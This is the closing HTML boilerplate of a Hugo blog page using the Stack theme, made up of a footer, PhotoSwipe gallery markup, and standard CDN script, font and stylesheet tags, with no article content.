2025 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>